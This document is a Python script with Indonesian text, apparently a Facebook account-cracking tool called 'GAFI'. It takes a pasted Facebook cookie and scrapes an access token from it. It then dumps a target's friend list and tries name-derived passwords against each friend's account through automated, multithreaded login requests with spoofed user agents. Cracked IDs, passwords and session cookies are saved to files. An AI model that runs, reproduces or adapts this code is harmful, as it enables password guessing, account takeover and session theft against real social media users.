def author(pm_aink):
	__raka_andrian___(f'{K} +{P}•{K}+{P} Tunggu Sebentar Nanti Diarahin Ke Facebook ...')
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/aa.raka27")
	back()

P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
import requests,json,os,sys,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
raka_andrian_tara,king_off_raka = [],[]
owh_jelas_donk_aink_kan_cowok = []
raka1,raka2,raka3,raka4,raka,rakaxxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0
sys.stdout.write('\x1b]2; Raka | GAFI \x07')
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def ___raka_ganteng___():
	clear()
	sol().print(f"""{H2}
         ▄████  ▄▄▄        █████▒██▓
        ██▒ ▀█▒▒████▄    ▓██   ▒▓██▒
{K2}       ▒██░▄▄▄░▒██  ▀█▄  ▒████ ░▒██▒
       ░▓█  ██▓░██▄▄▄▄██ ░▓█▒  ░░██░
{M2}       ░▒▓███▀▒ ▓█   ▓██▒░▒█░   ░██░
        ░▒   ▒  ▒▒   ▓▒█░ ▒ ░   ░▓  
         ░   ░   ▒   ▒▒ ░ ░      ▒ ░""")    
	sol().print("%s      ╔═════════════════════════════╗"%(Z2))
	sol().print("%s      ║%s  Github   : Bajingan-Z      %s║"%(Z2,B2,Z2))
	sol().print("%s      ║%s  Version  : %s3.0             %s║"%(Z2,B2,H2,Z2))
	sol().print("%s      ╚═════════════════════════════╝"%(Z2))
def gafi_login():
	os.system('clear')
	___raka_ganteng___()
	ses = requests.Session()
	sol().print(f' {M2}● {K2}● {H2}●')
	print()
	__raka_andrian___(f'{K} +{P}•{K}+{P} Gunakan Cookies Yang Masih Prawan...?')
	cok=input(f'{K} +{P}•{K}+{P} Cookies : {K}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}; link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok}); find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find)==0: __raka_andrian___(f'{K} +{P}•{K}+ {P}Cookie Anda Invalid'); time.sleep(2); gafi_login()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok}); took = re.search('(EAAB\w+)',xz.text).group(1); took = open(".token.txt","w").write(took); cok= open(".cok.txt","w").write(cok);__raka_andrian___(f"\n{K} +{P}•{K}+{P} Login Berhasil Jalankan Ulang Perintahnya ...");exit();os.system('rm -rf .token.txt && rm -rf .cok.txt');print(e);time.sleep(3)
	except Exception as e:exit(e)

def rakaexde():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			tim_gafi = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			gafi_donk = json.loads(tim_gafi.text)['name']
			menu(gafi_donk)
		except KeyError:
			gafi_login()
		except requests.exceptions.ConnectionError:
			print()
			__raka_andrian___(f'{K} +{P}•{K}+{P} Jaringan Error')
			exit()
	except IOError:
		gafi_login()
		
def Dump_Friendlist(idt,fields,cookie,token):
	try:
		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
		if len(id)==0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}", params=params, headers=headers, cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"]); sys.stdout.write(f"\r {K}+{P}•{K}+{P} Total Id : {len(id)}"), sys.stdout.flush()
		Dump_Friendlist(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except: pass

def menu(name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		__raka_andrian___(f'{K} +{P}•{K}+{P} Cookies Kadaluarsa Kea Tt Jendes ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
	sol().print(f' {M2}● {K2}● {H2}●')
	print()
	__raka_andrian___(f'{K} +{P}A{K}+{P} Crack Publik\n{K} +{P}B{K}+{P} Laporkan Bug\n{K} +{P}L{K}+{P} Keluar\n')
	_raka_andrian_tara_ = input(f'{K} +{P}•{K}+{P} Pilih  : ')
	if _raka_andrian_tara_ in ['01','1','a','A']:
		idt = input(f'{K} +{P}•{K}+ {P}Target   : '); Dump_Friendlist(idt,"",{"cookie":cok},token);perintah()
	elif _raka_andrian_tara_ in ['02','2','b','B']:
		author('pm_aink')
	elif _raka_andrian_tara_ in ['00','0','l','L']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} +{P}•{K}+{P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} +{P}•{K}+{P} Pilih Yang Benar Kentod...?')
		time.sleep(4)
		back()

def perintah():
	for rakaxc in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,rakaxc)
	print('')
	meki = input(f"{K} +{P}•{K}+{P} Tambahkan Password Manual {H}y{P}/{K}t{P} : {K}")
	if meki in ["y","Y"]:
		raka_andrian_tara.append("ya")
		pastam = input(f"{K} +{P}•{K}+{P} Masukan Tambahan : {K}")
		pwtod = pastam.split(",")
		for pwlist in pwtod:
			king_off_raka.append(pwlist)
	else:pass
	input(f'{K} +{P}•{K}+{P} Tekan Enter Untuk Mulai Crack')
	rakaxxx.append('async');seting_password()

def seting_password():
	global prog,des
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id))
	os.system('clear')
	print()
	with prog:
		with tred(max_workers=30) as rakaANDRIAN:
			for kocak_euy in id2:
				idf,nmf = kocak_euy.split('|')[0],kocak_euy.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				afa_aja_boleh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'321')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'123456')
						afa_aja_boleh.append(frs+'0'+str(random.randint(1,9)))
						afa_aja_boleh.append(frs+'2'+str(random.randint(1,9)))
				else:
					if len(frs)<3:
						afa_aja_boleh.append(nmf)
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'1'+str(random.randint(1,9)))
				if 'ya' in raka_andrian_tara:
					for recode_aja in king_off_raka:
						afa_aja_boleh.append(recode_aja)
				else:pass
				if 'async' in rakaxxx:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
				else:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
		print('')
		print(f'{K} +{P}•{K}+{P} Hasil : %s\n{K} +{P}•{K}+{P} Hasil : %s'%(okc,cpc))
		print('')
		print(f'{K} +{P}•{K}+{P} OK : {H}%s '%(ok))
		print(f'{K} +{P}•{K}+{P} CP : {K}%s '%(cp))
		print('')

def UserAgent(idf):
    rr = random.randint; rc = random.choice
    nomor = str(rc(['7.1.1','7.0','8.1.0','8.0.0','6.0','8','9','10','11','12','13','14','15']))
    a = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    b = (f"{str(rc(a))}{str(rc(a))}{str(rc(a))}{str(rr(11,99))}{str(rc(a))}")
    a = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B','OPR1']))
    b = (f"{str(rr(5000,299999))}")
    c = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020','021','022','023','024','025','026','027','028','029','030','031','032','033','034','035','036','037','039','040','041','042','043','044','045','046','047','048','049','050','051','052','053','054','055','056','057','058','059','060','061','062','063','064','065','066','067','068','069','070','071','072','073','074','075','076','077','079','080']))
    kombinasi = (f"{a}.{b}.{c}")
    OP = str(rc(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]))
    SM = str(rc(['SM-A015M','SM-A013M','SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN',
    'SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F']))
    RM = str(rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]))
    RD = str(rc(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]))
    ua0 = f'Mozilla/5.0 (Linux; U; Android {nomor}; en-us; {OP} Build/{b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 OppoBrowser/{str(rr(1,9))}.{str(rr(1,9))}.1'
    ua1 =f'Mozilla/5.0 (Linux; Android {str(rr(8,15))}; {SM} Build/{kombinasi}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,121))}.0.{str(rr(5000,10000))}.{str(rr(18,299))} Mobile Safari/537.3'
    ua2 =f'Mozilla/5.0 (Linux; U; Android {str(rr(9,15))}; en-us; {RM} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(53,119))}.0.{str(rr(2500,8000))}.{str(rr(134,299))} Mobile Safari/537.36 RealmeBrowser/{str(rr(1,35))}.{str(rr(1,5))}.0.{str(rr(1,8))}'
    ua4 =f'Mozilla/5.0 (Linux; U; Android {str(rr(8,15))}; zh-cn; {RD} Build/{kombinasi}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(109,119))}.0.{str(rr(4000,10000))}.{str(rr(118,299))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(10,19))}.{str(rr(1,9))}.{str(rr(100000,500000))}'
    CO = rc([ua0,ua1,ua2,ua4])
	return CO

def _async_2_(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint; rc = random.choice
	rakaxtc = random.choice([U,B,H,K,M])
	prog.update(des,description=f'\r {rakaxtc}GAFI {P}{(loop)}/{len(id)} Ok;{H2}{(ok)} {P}Cp;{K2}{(cp)}')
	prog.advance(des)
	ua = UserAgent(idf)
	ses = requests.Session()
	dataku, headersku = {}, {}
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			req1 = ses.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
			data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),'email':idf,'prefill_contact_point':'','prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}"}
			head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
			coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1715;{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
			req2 = ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, cookies={'cookie':coki}, allow_redirects=False)
			if 'checkpoint' in ses.cookies.get_dict().keys():
				tree = Tree(f"{P2}")
				tree.add(f"{P2}/sdcard/Cp {K2}{tgl}{P2}-{K2}{bln}{P2}-{K2}{thn}{P2}").add(f"{K2}{idf} {P2}• {K2}{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"{P2}")
				tree.add(f"{P2}/sdcard/Ok {H2}{tgl}{P2}-{H2}{bln}{P2}-{H2}{thn}{P2}").add(f"{H2}{idf} {P2}• {H2}{pw}{P2}")
				tree.add(f"{H2}{kuki}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

def back():
	rakaexde()

def __raka_andrian___(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)

def __raka_andrian___2__(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.030)			

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	rakaexde()
